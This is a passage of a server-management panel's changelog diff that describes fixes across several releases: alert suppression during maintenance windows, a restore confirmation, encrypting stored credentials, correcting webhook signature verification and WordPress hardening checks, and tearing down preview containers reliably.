+and SSL expiry. They also reached escalation policies, so a scheduled window
+could page an on-call rotation for the work it had been told about. The feature
+had been edited three times — a delete-result check, a foreign-key action, the
+client-role gate — without anyone checking that it suppressed anything.
+
+The engine now loads the open-window set once per tick and skips a silenced
+owner **at the source of each check, before any alert state is written**. That
+placement is the fix, not an implementation detail: `check_server_offline`
+selects the servers that have no firing row and then writes one, so a guard at
+the moment of firing would have left the row claiming the operator had been
+paged while nothing was sent — and the server would never have paged again. By
+skipping earlier, a held alert is deferred rather than lost: every one of the
+fourteen describes a standing condition re-evaluated every sixty seconds, so
+anything still true when the window closes fires on the next tick.
+
+**Alerts that report a one-off event are deliberately still delivered** —
+backup failure, backup verification failure, cron failure, security findings and
+SSL renewal failures. Nothing would raise those again afterwards, so suppressing
+one would lose it rather than defer it. The guide and the Maintenance page now
+say which are held and which are not, instead of promising both and doing
+neither.
+
+### Fixed — the site restore was the only destructive control in the product that fired on one click
+
+`docs/guides/backups.md` documents restoring a site as a four-step procedure
+whose fourth step is "Confirm the restore". There was no confirm. Of the seven
+restore- and rollback-class controls in the panel, six were armed behind a
+two-step press and this one — the widest of them, which replaces the site's
+files and drops and recreates every database's tables over the live one, with no
+automatic safety net — went on the first click. Its own table row already armed
+the strictly smaller **Delete**, six lines below it.
+
+The restore now arms the same inline two-step used by the backup orchestrator,
+and the armed state states what the archive holds and that anything not in it is
+left as it is. The backend already built that disclosure, but emitted it into the
+progress stream *after* the job was spawned, so the operator read it with no way
+to stop. The wording deliberately does not reuse the table's own reassurance
+text: that keys on the databases the site had **when the backup ran**, while the
+restore decides on a live count, so a site that gained a database since would
+have been told "no database was attached" over exactly the case the restore then
+reports as an error.
+
+### Fixed — alert rules documented under a tab that does not exist
+
+The monitoring guide twice told operators to configure alert rules and
+notification channels under **Alerts › Rules**. The Alerts page has four tabs and
+none of them is Rules; both live under **Settings › Alert Channels**. Both
+references now name the real location. This one was live on the published
+documentation site, not just in the repository.
+
+### Fixed — four published measurements no guard could see drift
+
+The measurement register's surface map is what stops a published number going
+stale, and it was a hand-maintained list with no check that it covered the
+register. Four metrics fell through: the API's memory footprint had no entry at
+all, and the agent binary, the agent's memory footprint and the full-stack total
+were each mapped to some but not all of the surfaces that publish them. Four of
+the five gaps were on the single README line the previous release had repaired —
+that fix mapped two figures on the line and left its four neighbours unguarded.
+
+The map is now **total over the register**: a metric must be mapped to its
+surfaces or explicitly declared as published nowhere else, and anything else
+fails, exactly as the neighbouring check already does for derived metrics. The
+match also demands the unit the register states, because a bare number is a test
+a coincidence can pass — README carries "14 categories" twice, which would have
+satisfied a check for the 14 MB API footprint no matter what the line said.
+
+
+
+## [2.130.0]
+
+### Fixed — the credential promise the project publishes, and the registries that could not tell it was broken
+
+**Three stored credentials were not encrypted at rest, while two surfaces said
+every one of them was.** `SECURITY.md` and `README.md` both state, without
+qualification, that all stored credentials are encrypted with AES-256-GCM.
+`cdn_zones.api_key`, `git_deploys.github_token` and `servers.agent_token` were
+written in cleartext — the last one named in exactly those terms by
+`auto_healer`'s own comment about what a panel database dump carries off the
+box. The claim was false on the project's front page, and nothing in the tree
+compared the sentence with the columns, so it could not be found by any test.
+
+All three now encrypt at every writer and decrypt at a single choke point, the
+shape `helpers::cf_headers` already used for the Cloudflare token: every Bunny
+caller funnels through `cdn::bunny_headers`, all seven GitHub-token readers
+funnel through `set_github_status` (and the token never leaves the backend), and
+the one place that dials a remote agent decrypts in `AgentRegistry::for_server`.
+Reads use the legacy-tolerant variant, so **an existing install keeps working
+with no migration and an already-enrolled fleet keeps dialling** — a strict
+decrypt here would have stranded every server enrolled before this release, and
+that is pinned so it cannot be "tidied" later. Inbound agent authentication is
+unchanged: it verifies `agent_token_hash`, which this release does not touch.
+
+**The git-deploy token is also masked on the two handlers that still returned
+it.** `create` and `update` answered with `RETURNING *`, so a freshly written
+token went back over the wire in full while `list` and `get_one` masked theirs.
+All four row-returning handlers now mask, and the writer-side helper **refuses
+the mask sentinel**: every handler now returns `●●●●●●●●`, so a client that
+submits the form it was served would otherwise have overwritten a working token
+with eight circles — or, worse, stored the circles encrypted, where they would
+look like a legitimate credential to every later read. v2.48.3 shipped that
+class of bug once already.
+
+**The anti-drift registry could be satisfied without doing its job.** The
+re-encryption sweep asserts that every module writing a credential is named in
+`COVERED_MODULES` — but naming it was enough. The column still had to be added
+to `SIMPLE_SUBJECTS` by hand, and nothing checked that, so a module could be
+declared covered while its credential was skipped by every re-key for ever. That
+is the failure the file's own header warns about, reproduced inside the mechanism
+meant to prevent it. Modules now declare **which subject** re-keys them, and a
+test rejects a subject the sweep does not actually visit.
+
+Its census was also scoped to `src/routes`, so a credential written by a service
+was invisible — and this release created the first one. The walk now derives its
+population from the crate root and descends, because a scope that is a literal
+list can always be shortened silently: an earlier cut of this very fix asserted
+its two directory names against the set built from those same two names, which is
+a tautology, and a mutation walked straight through it. `POST /api/settings/reencrypt-credentials`
+now reports the swept columns alongside the covered modules.
+
+### Fixed — published numbers that had drifted from what they describe
+
+- `README.md` published the API binary at **~22MB** against a register reading
+  23 MB and a published asset of 23.2 MB. The commit that re-measured the sizes
+  moved the README masthead and missed the README body — a second quoting site in
+  a file it had already opened — and no arm could see it, because
+  `docs-claims-pin-e2e.sh`'s surface map had **no row for `API binary`** while both
+  of its line-mates had one. The map now covers it, plus `CLI binary` and the
+  three further surfaces that publish the template count; the superseded figure is
+  pinned so it cannot come back.
+- `FEATURES.md` cited `services/credential_crypto.rs` for the row describing the
+  project's own credential encryption. **That file has never existed**; the real
+  one is `services/secrets_crypto.rs`. Every source citation in that table is now
+  checked to resolve — all 51 of them — because the whole column was unverified.
+- `docs/testing.md` said two advisories were ignored narrowly; `audit.toml`
+  ignores one. Its unit-test line is re-derived to 599 (374 backend, 225 agent).
+
+### Testing
+
+New `credentials-at-rest-pin-e2e.sh` (35 assertions) pins both ends — each
+writer, each decrypting choke point, the mask population derived from the
+handlers that return a row, and the published sentence against the registry —
+so the promise cannot return without the columns, nor the columns regress
+without the promise going red. 77 suites, **2553 assertions**. 20 mutations
+planted, 20 killed by the arm written for them; two of the instruments were
+wrong first, and both were caught by their own plants.
+
+## [2.129.0]
+
+### Fixed — three controls the panel rendered, described, or gated on, that nothing could reach
+
+**A public inbound door with no way to shut it.** `webhook_endpoints.enabled` is
+what the gateway reads before it will look at an incoming request at all, and
+`webhook_routes.enabled` gates every outbound forward. Nothing in the product
+wrote either column. Both were born `TRUE` and stayed `TRUE` for the life of the
+row: the SPA declared them on its types and read them nowhere, the CLI has no
+webhook surface, and the only `UPDATE` statements against those tables increment
+delivery counters. So the only way to stop a webhook endpoint receiving, or a
+route forwarding, was **Delete** — and `webhook_deliveries` and `webhook_routes`
+both cascade from the endpoint, so shutting the door destroyed the record of
+everything that had already come through it. Closing a door and discarding its
+history are different operations. Both tables now carry a **Status** column and a
+**Pause** / **Resume** control, served by two ownership-scoped handlers.
+
+**A replay went somewhere the delivery never did.** The inbound path evaluates
+each route's `filter_path` / `filter_value` and skips the routes that do not
+match. `replay_delivery` evaluated nothing — it forwarded to every enabled route,
+so replaying sent the payload to destinations the operator had deliberately
+excluded, each with that route's stored headers attached and its retry budget
+behind it. The guide has always said a replay goes to the *matching* routes; only
+the code disagreed. Both paths now take the same decision through one function,
+and both report the number of routes they actually forwarded to instead of the
+number of routes that existed. Replaying a delivery the gateway *refused* remains
+possible — it is a documented capability, and the usual cause is a sender
+configured with the wrong secret — but it now asks for confirmation instead of
+firing on a click beside a red **Invalid** badge, and it is written to the
+activity log, which no replay ever was.
+
+**A badge that had rendered nothing since March.** Seven arms across four layouts
+drew the open-incident count when a nav item's route was `/incidents`. The
+navigation consolidation of 2026-03-24 deleted that row and redirected the route,
+touching neither the arms nor the sixty-second poll feeding them, so the
+comparison could never again be true — while four unattended services went on
+minting incidents for whoever owned the failing resource. On the machine this
+release was built on, nine incidents had been sitting open, invisible, since
+April. The arms now key on the row that exists, and `/incidents` lands on the tab
+that actually holds incidents rather than the default one.
+
+The count itself was also narrower than the panel's own definition of an open
+incident: the poll asked for `investigating`, one of three open statuses, so an
+incident left the badge the moment anyone moved it to `identified` — the first
+thing the incident screen offers — while the dashboard went on counting it. There
+is now a single endpoint that answers the question, and the badge asks it.
+
+### Fixed — published figures and instructions that were wrong
+
+- The guide gave the endpoint URL as `/hook/abc123`. That path exists nowhere in
+  the product; an operator following the guide handed their sender a 404. It now
+  gives the real one, and says the URL is itself the secret.
+- The API reference documented a replay route that does not exist, omitted the
+  public receiver entirely, and published `821 REST endpoints (533 backend)`
+  against a register reading 822/534 — while stating in the same sentence that it
+  took the figure from that register.
+- The incidents guide still told operators to click a sidebar row deleted in
+  March.
+
+### Changed — the mechanism behind the last of those
+
+`docs/api-reference.md` could drift because it was not in the surface map that
+`docs-claims-pin-e2e.sh` checks the register against, so no arm could see it. It
+is in the map now. This is the second recurrence of that shape; the first left two
+agent metrics wrong on the docs site for 146 days.
+
+### Added — regression pins
+
+- `reachable-controls-pin-e2e.sh` §G derives every route literal compared against
+  the nav registry — from all **three** readers, not just the layouts — and
+  asserts each one resolves. A layouts-only arm was written first and stayed green
+  when a retired route was planted in either of the other two.
+- `webhook-verification-pin-e2e.sh` §H pins both toggles, the shared routing
+  decision on both forwarding paths, the replay confirmation and its audit entry.
+
+## [2.128.0]
+
+### Fixed — a port allocator and the unique index behind it disagreed about what a port is unique within
+
+`20260319000000_multi_server.sql` un-globalised five columns under the header
+*"domain should be unique per server, not globally"*. One of them was
+`git_deploys.host_port`, which became a unique index on `(host_port, server_id)`
+and has agreed with its allocator ever since. The **next** migration, one day
+later, re-introduced the global shape on two neighbouring columns whose
+allocators were already server-scoped.
+
+Both allocators pick the first free port from a set scoped to one server, so on
+any install with more than one server the second server's set is empty, it picks
+the bottom of the range, and the INSERT collides with a row belonging to the
+first server. It is not a race. It repeats on every attempt, because the losing
+server never records anything that would make its own set grow.
+
+**Git previews built a container nothing could ever reap.** The rejected insert
+was logged at `warn` and stepped over, and the deploy task ran anyway — so the
+container, its published port, its vhost and its Let's Encrypt certificate were
+created with **no database row**. Every consumer of a preview is row-driven (the
+previews list, Delete Preview, the TTL and stuck sweeps, the parent delete), and
+nothing on the box reconciles running containers against rows, while Docker's own
+`unless-stopped` policy carried the orphan across crashes and reboots. The same
+function already refused, forty lines higher, to overwrite a preview row for
+exactly this reason. A failed write is now a refusal: nothing is built that
+cannot be found again. The reason returned to the pusher is a fixed sentence —
+it is echoed into an unauthenticated webhook response and into GitHub's delivery
+log, so the database error goes to the operator's journal instead.
+
+**Node and python sites could not be created on any server but the first.** The
+same collision on `sites.proxy_port`, inside a transaction whose error arm mapped
+every `duplicate key` to `CONFLICT "Domain already exists"` — so a port-allocator
+failure was reported as a taken domain, which sends the operator to look at DNS.
+Port collisions now say so. The allocator's own comment claimed a range of
+`4000-4999` while the query walked `5000-5999`; it now names the range it walks.
+
+`git_previews` gains the `server_id` its allocator already scopes by, backfilled
+from its git deploy — a unique index cannot reach through the JOIN the sweeps
+use. `sites` already had one.
+
+### Added
+
+- `port-scope-pin-e2e.sh` — 30 assertions, 16 red at v2.127.0. It **derives** the
+  population from the migrations rather than listing it: every unique index over
+  a port column that survives the DROPs, checked against the scope of the
+  allocator that feeds it. The invariant is not "a port index must name
+  `server_id`" — `databases.port` is globally unique *and* globally allocated,
+  which is correct, because that table has no server to scope by. A port index on
+  a table the arm has not been taught about fails on purpose, which is the step
+  that was skipped in 2026-03.
+
+## [2.127.0]
+
+### Fixed — the webhook gateway's signature verification told the operator four things that were not true
+
+An endpoint could be stored asking for HMAC verification it had no secret to
+perform. Both verification arms were shaped
+
+```rust
+if let (Some(secret), Some(header_name)) = (&endpoint.verify_secret, &endpoint.verify_header) { … } else { None }
+```
+
+and the rejection below them fired only on `Some(false)`, so `None` — *no secret*
+— passed. The delivery was then relayed to every enabled route. The endpoint list
+showed the mode it had been given, so the screen read as verified while nothing
+was being verified.
+
+**The blank secret was worse than the absent one.** The create form posted `""`
+for a field left empty, and HMAC accepts a zero-length key. An endpoint stored
+with a blank secret and a real header name therefore verified signatures *against
+the empty key*: anyone who guessed that could compute one, be recorded
+`signature_valid = true` — a positive attestation of authenticity — and be
+forwarded downstream as genuine.
+
+Verification is now graded by one function, `classify_signature`, which
+distinguishes *not asked to verify* from *asked to verify and unable to*. Blank
+counts as absent on both the write and the read path, a mode this build cannot
+compute is a rejection rather than a pass, and only an endpoint that never
+claimed to verify anything records no attestation. Creating an endpoint with a
+verification mode now requires both the secret and the header, because there is
+no update route — the settings cannot be repaired later, only recreated.
+
+### Fixed — a rejected delivery left no trace, so the panel could not show one
+
+The rejection returned **above** the delivery `INSERT`. `signature_valid` could
+therefore only ever hold `TRUE` or `NULL`: the `FALSE` state had no writer in any
+commit. The delivery list's red *Invalid* badge could never render, and the
+guide's promise that "failed verifications are logged" was false. An endpoint
+whose secret was blank rejected every legitimate webhook and recorded nothing at
+all — the operator saw `Received: 0` and no explanation anywhere.
+
+Deliveries are now recorded before the request is accepted or refused, and the
+`Received` counter covers the same population the list shows. The trade-off is
+stated rather than hidden: a caller who knows the endpoint token can now cause a
+row to be written without knowing the secret. That was already true of an
+endpoint verifying nothing, the rows fall under the same retention sweep as any
+other delivery, and nothing is forwarded.
+
+### Fixed — the shared secret was sent to the browser
+
+`WebhookEndpoint` is returned to the client directly and nothing suppressed
+`verify_secret`, so listing the Webhook Gateway screen shipped every endpoint's
+HMAC secret to the browser. The SPA never displayed it, which is why it went
+unnoticed — it was on the wire, not on the page. Six other route modules already
+suppress a stored credential this way. The field is now suppressed, and the list
+reports only whether a secret is present.
+
+That presence answer is also what the screen needed: an endpoint stored in the
+unverifiable state before this release cannot be edited, so the list marks it
+*no secret — rejecting* and the guide says to delete and recreate it.
+
+### Tests
+
+New `webhook-verification-pin-e2e.sh` — 38 assertions, **26 red at v2.126.0**.
+§C compares line positions rather than text, because the missing `FALSE` writer
+was a purely positional defect: every line involved was correct on its own and
+the rejection simply stood above the `INSERT`. 16 new unit tests grade the
+verdict function directly, including a signature computed under the empty key
+that must not authenticate. 8 mutations planted, 8 killed, subjects byte-identical.
+
+Unit tests 582 → 598. Regression assertions 2437 → 2475 across 75 suites.
+
+## [2.126.0]
+
+### Fixed — a hardening check that reported "pass" because its own fix had written the word it was looking for
+
+Four of the WordPress toolkit's seven security checks read `wp-config.php` as one
+long string and asked two **independent** questions of it: does the constant's
+name appear anywhere in the file, and does the value literal appear anywhere in
+the file. They answered `pass` when both were true — of two entirely unrelated
+lines.
+
+```rust
+status: if wp_config.contains("DISALLOW_FILE_EDIT") && wp_config.contains("true")
+```
+
+Any `true` anywhere in the file satisfied `DISALLOW_FILE_EDIT` and
+`FORCE_SSL_ADMIN`. Any `false` anywhere satisfied `WP_DEBUG`.
+`WP_AUTO_UPDATE_CORE` was never compared to a value at all — its presence was the
+whole test, so `WP_AUTO_UPDATE_CORE false` reported `pass`.
+
+**The fix disarmed the verifier.** `apply_hardening` writes exactly those
+literals — `DISALLOW_FILE_EDIT true`, `WP_DEBUG false`, `FORCE_SSL_ADMIN true`,
+`WP_AUTO_UPDATE_CORE true` — so after a single hardening run the file contains
+both words, and three of the four checks can never report a regression again.
+Turn `DISALLOW_FILE_EDIT` back off on a site DockPanel has hardened and the panel
+still says "File Editing Disabled: pass". A site following wordpress.org's own
+debugging recipe — `WP_DEBUG` on beside `WP_DEBUG_DISPLAY` off — reported "Debug
+Mode Disabled: pass" with debug on.
+
+It is worse than a wrong label, because the panel's controls key off the verdict:
+both the per-check **Fix** button and the bulk fix render only for a check that is
+not passing, and the site badge reads "All Passed". A falsely-passing check takes
+its own remediation off the screen and tells the operator there is nothing to
+remediate.
+
+Each check now reads the value bound to its **own** constant. The parser handles
+what a real `wp-config.php` carries: commented-out `define`s do not count, a `//`
+inside `'https://example.com'` is not a comment, the first `define` wins because
+that is what PHP does, and a non-empty string is truthy — so `'false'` is `true`,
+which is the spelling that reads most like its opposite. A value it cannot
+classify grades as a failure to verify, never as a pass: on a safety check the
+unverifiable case must not land on the safe-looking side.
+
+`$table_prefix` is left as it was. It tests one exact assignment rather than two
+independent substrings, so it does not carry this defect.
+
+### Fixed — a working fix that no operator could reach
+
+`auto-updates` is declared auto-fixable and has a working arm in
+`apply_hardening`, but its failing status was `warning` and never `fail`, while
+both fix controls rendered only for `fail`. The fix existed, was advertised, and
+had no button — reachable only by hand-crafting the HTTP request.
+
+Both controls now render for any non-passing auto-fixable check, and an explicit
+`WP_AUTO_UPDATE_CORE false` grades as a failure rather than a pass. An absent
+constant stays a warning, because that is WordPress's own default rather than a
+regression — and it now offers its fix too.
+
+The site badge is read off the same population. "All Passed" was printed whenever
+nothing had *failed*, which was already untrue over any row rendering a warning
+triangle, and would now have sat beside a "Fix 1 Issue" button counting that same
+warning. The badge and the bulk control read one list.
+
+This is the third correction to a claim v2.125.0 made about that guide's "7
+checks (6 auto-fixable)". The first release made four of them run, the second
+made the fifth work, and this one makes the sixth reachable and stops the other
+four from grading the wrong thing.
+
+### Testing
+
+14 new unit tests, and they are the verification rather than a companion to it:
+each of the four constants is sabotaged in the file `apply_hardening` itself
+produces, and only that constant's own check is allowed to turn red. Unit tests
+582 (357 backend, 225 agent). `sibling-parity-pin-e2e.sh` gains §E8 — every
+constant the hardening path manages must be graded on the value bound to its own
+name, with the population derived from `apply_hardening` rather than listed — and
+§E9, that no working fix is stranded behind a status word the UI does not accept.
+Both arms go red against v2.125.1, and three planted reversions were each killed
+with the subjects restored byte-identical.
+
+⚠ Six of those tests initially passed only as root. They build a real site tree
+and run `check_security` against it end to end, which is what makes them worth
+having — but they built it under `/var/www`, which only root may write, so they
+passed on a box where the agent runs as root and failed in CI, which does not.
+No shipped binary was affected; the fault was entirely in the harness.
+`services::backups` had already solved this, defining `webroot_root()` under
+`#[cfg(not(test))]` and again under `#[cfg(test)]` beneath the system temp
+directory. `wp_vulnerability` now does the same, and the three functions in it
+that each derived `/var/www/{domain}` independently share one helper.
+
+A source pin for that class was written and then rejected rather than shipped:
+every shape that is clean at HEAD fails to catch the actual defect, because the
+path literal and the call that used it sat on different lines, and every shape
+that does catch it is red against between five and twenty-two pre-existing
+siblings. An arm carrying that many carve-outs is how a suite stops being read.
+
+## [2.125.1]
+
+### Fixed — the sixth hardening fix failed on exactly the sites most likely to use it
+
+v2.125.0 repaired the four WordPress hardening fixes that ran through wp-cli and
+said, in this file, that `docs/guides/wordpress.md`'s "7 checks (6 auto-fixable)"
+was true for the first time. It was not. Verifying that claim found the sixth
+one broken for an unrelated reason.
+
+`block-php-uploads` writes a deny rule to `wp-content/uploads/.htaccess` with a
+bare `std::fs::write`, and **WordPress core does not ship `wp-content/uploads`** —
+`wp core download` produces `wp-content/{index.php,plugins,themes}` and nothing
+else. Wherever that directory is absent the write returned "No such file or
+directory" and the fix silently did not apply. Five of six worked, not six.
+
+Scope, measured rather than assumed: a site installed through DockPanel's own
+WordPress flow is **not** affected — `wp core install` creates the uploads tree
+on the way through, so the directory is already there. The toolkit hardens any
+site carrying a `wp-config.php`, though, so the ones it bit are the ones it did
+not install: WordPress an operator uploaded or unpacked themselves, a site
+restored from an archive or brought in by the migration importer, and any install
+whose uploads directory had not been created yet.
+
+It now creates the directory — and hands it to the web user in the same
+statement. Creating it alone would have been worse than the bug: a root-owned
+`uploads` directory stops WordPress writing media at all, so the hardening would
+have traded a skipped rule for a broken media library. The sibling chown that
+already existed covered the `.htaccess` file and not its parent.
+
+Driven on a throwaway server, agent binary the only variable, against a real
+WordPress site with the directory absent: v2.125.0 answered
+`{"applied": false, "message": "Failed: No such file or directory (os error 2)"}`;
+v2.125.1 answered `applied: true`, created the directory owned `www-data:www-data`,
+wrote the rule — and `www-data` could still create a file there, which is the
+check that matters, because the version of this fix that only creates the
+directory would have left it root-owned and broken media uploads outright.
+
+`sibling-parity-pin-e2e.sh` §E gains E7, asserting both halves — the parent is
+created, and the chown names the directory. Both were mutation-tested, and the
+first version of the arm was decorative twice over: it matched the bare word
+`chown`, which survives a rename to `chownX`, and its anchored replacement
+spanned two source lines where the matcher is line-based. Neither showed up in
+review; both showed up the moment a defect was planted.
+
+## [2.125.0]
+
+### Security — h2 unbounded empty DATA frames (RUSTSEC-2026-0258)
+
+`h2` 0.4.15 → 0.4.16 in the agent and the API. The advisory was published on
+2026-08-17, after v2.124.0 shipped, so it is new rather than missed; `cargo audit`
+is what surfaced it, as it is for every Rust advisory — Dependabot does not carry
+them.
+
+### Fixed — the WordPress vulnerability scan reported a clean site it had never read
+
+The WordPress Toolkit's scanner asks wp-cli for the site's plugin list, then
+checks each plugin against the known-vulnerable set. It could never get that
+list.
+
+Its primary call ran `wp plugin list` **without `--allow-root`**. The agent runs
+as root, and wp-cli refuses outright in that case — *"YIKES! It looks like
+you're running this as root"* — so the call failed on every install. The
+fallback then shelled out to `php` against a phar staged under the agent's tmp,
+a file nothing in this tree has ever written, and which `PrivateTmp=yes` puts
+out of reach of anyone who might try to place one there. Both arms failed.
+
+The result was read by an `if output.status.success()` with no `else`, and the
+function returned `Ok` regardless — `total_vulns: 0`, `critical_count: 0`,
+`high_count: 0`. So every scan of every site reported no vulnerabilities, and
+the panel recorded and rendered that zero as a result. A site with a known
+exploited plugin scored exactly the same as a clean one.
+
+The same dead phar was the *only* invocation behind four of the six one-click
+hardening fixes — disabling the file editor, turning off `WP_DEBUG`, forcing SSL
+on wp-admin, and enabling core auto-updates. Each returned "Failed to set X"
+with no reason, the toolkit re-ran the check, and the same four stayed failing.
+Pressing "Fix issues" again did the same thing. Only the two fixes that do not
+use wp-cli — the `wp-config.php` permission change and the uploads `.htaccess` —
+have ever worked. `docs/guides/wordpress.md` advertises 7 checks with 6
+auto-fixable; that sentence is true for the first time with this release.
+
+Two further defects in the same scan, both of which would have survived fixing
+the invocation alone:
+
+- The "outdated" test was inverted. wp-cli's `update` field is a **status** —
+  one of `none`, `available`, `unavailable`, or `version higher than expected` —
+  and the code read `update != "none" && update != "available"`, which is true
+  for exactly the two states in which no update can be applied and false for the
+  one in which it can. It then reported that status word as the plugin's
+  `latest_version`, so the UI would have offered "update to unavailable". The
+  version has always been in `update_version`, a field nothing in the tree read.
+- A scan whose wp-cli call fails now says so instead of returning zeros.
+
+The root cause was a second, hand-rolled wp-cli invocation. `services/wordpress.rs`
+owns this: it installs the binary, passes `--allow-root`, and decides the
+plugin/theme skip policy. `services/wp_vulnerability.rs` wrote its own and got
+both halves wrong. That module now calls the same entry point, which was
+extracted so it can take an explicit root — the scanner resolves its own,
+because a WordPress install is not always under `public/`.
+
+The scan runs with `--skip-plugins --skip-themes`: a vulnerability scanner must
+not execute the code it is scanning, on a site that may already be compromised,
+in a process running as root.
+
+Repairing the scan armed a dormant collapse. `scan_site` could not fail before,
+so this route's error arm had never executed — and it returned a 5xx, which the
+panel replaces with "Operation failed. Reference: <uuid>". A scan that could not
+run would have been opaque instead of merely wrong. It now returns 422 like the
+other routes in the same file, so wp-cli's own sentence reaches the operator:
+*"wp-cli could not list plugins for example.com: Error establishing a database
+connection."* Eight routes in that file still collapse their agent's sentence
+this way; that is a pre-existing carry, and §E prints the count on every run
+rather than leaving it in a note somewhere.
+
+`sibling-parity-pin-e2e.sh` gains §E, seven arms that derive the population of
+wp-cli invocations from the crate rather than from a list: one owning module,
+every call site carrying `--allow-root`, no phar run through the interpreter,
+the scanner propagating its failure, and the version taken from `update_version`.
+Against the previous release it reports the defect itself — two modules
+invoking wp-cli, five phar invocations, and a scanner branching on an exit
+status it never checked the other side of.
+
+Driven on a throwaway server against a real WordPress install carrying two
+plugins from the scanner's own vulnerable set, with the agent binary as the only
+variable: v2.124.0 reported `total_vulns: 0` for a site running a critical
+auth-bypass plugin and failed four of four hardening fixes; v2.125.0 reported
+2 vulnerabilities, 1 critical, with the correct available versions, and applied
+all four — confirmed by reading the constants back out of `wp-config.php`.
+Stopping the database made the scan answer 422 with the reason; restarting it
+made the same call succeed again, which is the control that separates a fix from
+a refusal.
+
+## [2.124.0]
+
+### Fixed — a deleted branch orphaned a running preview, and the panel reported success
+
+Tearing a preview deployment down is two steps: ask the server to remove the
+container, its port and its vhost, then delete the `git_previews` row. That row is
+the only record any of it exists — the five-minute cleanup sweep, the previews
+list, the operator's Delete button and the port allocator all start from it.
+
+`preview_cleanup.rs` has always known this and says so at its own teardown:
+
+> KEEP THE ROW. It is the only record that this container, this port and this
+> vhost exist — deleting it anyway frees the port for reallocation while the
+> container still holds it, and leaves the container invisible to every list,
+> cleanup and delete path there is.
+
+That guard was wired into the two sweeps. There are **seven** doors that tear a
+preview down, and the other five discarded the server's answer and deleted the
+record regardless. Nothing in the repository asked how many callers existed; the
+pin arm counted the doors and passed at four or more, which two guarded plus five
+unguarded satisfies just as well.
+
+The consequences, per door:
+
+- **The webhook (`deleted: true`)** — reached with **no authentication**, so an
+  ordinary branch deletion by anyone who can push fires it. If the teardown
+  failed for any reason — server offline, agent mid-restart, Docker busy — the
+  container kept running and serving the deleted branch's code, holding its port,
+  with nothing left that could find it. The sweep could not retry, because the
+  sweep reads the row. The port went back into the 8000-8999 pool and the next
+  preview push could not bind.
+- **Delete Preview** — answered `{"ok": true}` over a failed teardown. The
+  operator was told it worked, so they never looked again, and the record they
+  would have retried with was already gone.
+- **Deleting a git deploy** — the same discard for every preview *and* for the
+  deployment's own container, image, vhost, certificate and checkout, three lines
+  apart, immediately before the cascade that removes the last record of them all.
+- **Re-deploying a preview** whose container predates the v2.55.0 name space —
+  the upsert overwrites `container_name`, so a teardown that quietly failed left
+  the predecessor orphaned. The comment above that query already described this
+  outcome; nothing acted on it.
+
+Now every door reads the answer. A failed teardown keeps the record, and the two
+operator-facing doors **refuse** and name what is still standing rather than
+reporting success — retryable by construction, since `/git/cleanup` answers Ok for
+a container that is already gone. Deleting a git deploy cannot become permanently
+blocked: the same handler already refuses earlier when the host is unreachable.
+
+Worth being exact about what keeping the record buys, because the cleanup sweep's
+five-minute cadence is not the same thing as a preview being eligible for it:
+`preview_cleanup` collects a `deploying` or `failed` preview an hour after its last
+update, a `running` one after `preview_ttl_hours`, and **neither, ever, when that is
+set to 0** — the documented opt-out from automatic cleanup. On an opted-out install
+the operator's own Delete Preview button is the only way back, which is exactly why
+the record has to survive: before this, that button had nothing left to act on.
+
+`container-identity-pin-e2e.sh` gains §H, which derives the doors from the
+operation's own syntax and asserts every one of them individually — a membership
+test, because a count is what let this through. Against the previous release it
+reports *"only 2 of 7 teardown doors read the result at all."*
+
+### Fixed — the webhook said "preview deploy triggered" for pushes it had dropped
+
+Found while fixing the above, and the same class of claim. Three things abandon a
+preview *before* anything is spawned — a branch name too long to form a host name,
+no free port in 8000-8999, and now a predecessor container that could not be torn
+down — and the webhook answered `Preview deploy triggered for branch 'x'` for all
+three. That answer goes to GitHub's delivery log, which is the one place the person
+who pushed would look to find out what happened.
+
+It now reports the reason instead. Still HTTP 200, deliberately: the delivery
+itself succeeded, and a non-2xx would put GitHub into a retry over a decision that
+a retry cannot change. Failures *after* the build task is spawned were already
+honest — they land on the row as `status = 'failed'` and show in the previews list.
+
+## [2.123.1]
+
+### Fixed — the SMTP relay could never be configured, on any install
+
+`POST /smtp/configure` wrote msmtp's system-wide config at `/etc/msmtprc` — a
+**bare file at the top of `/etc`**. The agent runs `ProtectSystem=strict`, and
+`ReadWritePaths` names `/etc/postfix`, `/etc/dovecot`, `/etc/php` and a dozen
+more directories but no such file, so every call answered:
+
+```
+Failed to write /etc/msmtprc: Read-only file system (os error 30)
+```
+
+Marking the file in `ReadWritePaths` cannot fix it: marking a path that does not
+exist yet is inert, and *creating* it would need `/etc` itself writable, which is
+what the sandbox exists to prevent. This is the same shape as `/etc/opendkim.conf`
+in v2.36.0, and it takes the same cure the mail installer already took — the
+config now lives at **`/etc/dockpanel/msmtprc`**, inside `ReadWritePaths`, and
+every reader is told where it is: Test Email passes `--file`, and PHP's
+`sendmail_path` carries it too.
+
+Driven on a box, before and after, with the agent binary as the only variable:
+the same request goes from that error to `{"ok":true}`, with the config landing
+`0600` and the relay log `0660 root:www-data`.
+
+⚠ **This is why v2.123.0's msmtp permission work mattered less than it looked**:
+it hardened a path that could not run. Both halves are now real.
+
+### Fixed — the sandbox coverage check could not see a path held in a `const`
+
+`agent-sandbox-paths-pin-e2e.sh` §4 discovers every path the agent writes and
+asserts each one is covered by `ReadWritePaths` — deliberately derived rather
+than listed, so a new write cannot be forgotten. It extracted path **literals
+appearing inside the writing function**, so `fs::write(MSMTP_CONFIG, …)` with
+`const MSMTP_CONFIG = "/etc/msmtprc"` at the top of the file was invisible to it,
+and the section whose entire job is this class reported a clean sweep while the
+defect above sat in the tree.
+
+It now resolves same-file `const` declarations and folds them through the same
+coverage check — 8 const-held write paths on top of the 62 literals. Verified by
+planting the original `/etc/msmtprc` back and watching the arm name it.
+
+## [2.123.0]
+
+### Fixed — backup retention destroyed the only record of every archive on another server
+
+The nightly retention sweep enforces `retention_count` by unlinking the archive
+and then deleting the row that names it. For site schedules it did both
+unconditionally: it built a path on the **panel's** filesystem, called
+`remove_file`, discarded the result, and deleted the row anyway.
+
+On a single-server install that is correct. On a fleet it is not. `std::fs`
+reaches the panel host and no other, so for a site hosted on a member the unlink
+hits a path that does not exist there, the `NotFound` goes into a `let _ =`, and
+the row is deleted regardless. **The archive stays on the member with nothing
+pointing at it** — the row is the only record `list`, `restore` and `delete` all
+start from, so the backup is unreachable by every route the panel has. The
+pruned count was incremented in the same breath, so the log reported archives it
+had never touched.
+
+Nothing about this is opt-in. Creating a site auto-creates a daily schedule with
+`retention_count = 7`, and the sweep runs outside the auto-healing switch, so it
+begins on day 8 for every remote site and needs no operator action to start.
+
+The rule was already written down, and the guard already existed. Two hundred
